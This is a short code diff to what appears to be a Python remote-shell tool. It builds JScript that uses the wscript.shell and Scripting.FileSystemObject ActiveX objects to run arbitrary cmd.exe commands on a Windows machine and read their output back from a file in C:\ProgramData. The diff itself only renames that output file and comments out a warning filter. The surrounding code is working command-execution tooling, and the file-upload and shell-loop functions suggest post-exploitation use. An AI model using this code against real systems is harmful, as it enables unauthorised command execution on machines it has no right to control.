@@ -74,14 +74,14 @@ def run_cmd_command(command, delay, print_output=True, use_tmp_file=True):
     :return: output of the command
     """
     send_cmd = "var oShell = new ActiveXObject('wscript.shell');" \
-               f"oShell.Run('cmd.exe /c {command} > C:\\\\ProgramData\\\\output.txt');"
+               f"oShell.Run('cmd.exe /c {command} > C:\\\\ProgramData\\\\output16.txt');"
 
     send_cmd_no_tmp_file = "var oShell = new ActiveXObject('wscript.shell');" \
                            f"oShell.Run('cmd.exe /c {command} ');"
 
     get_cmd_result = "var myFileSysObj = new ActiveXObject('Scripting.FileSystemObject');" \
                      "var myOutputTextStream = myFileSysObj.OpenTextFile" \
-                     "('C:\\\\ProgramData\\\\output.txt', 1, true);" \
+                     "('C:\\\\ProgramData\\\\output16.txt', 1, true);" \
                      "var x = '';" \
                      "while (!myOutputTextStream.AtEndOfStream){x += myOutputTextStream.ReadLine() + '\\n';}" \
                      "x;myOutputTextStream.Close();"
@@ -117,7 +117,7 @@ def send_base64encoded_file(origin_path, destination_file_name):
 
 def main():
     # shell Settings
-    warnings.filterwarnings("ignore")
+    # warnings.filterwarnings("ignore")
     run_in_shell = True
     delay = 0
     # main loop
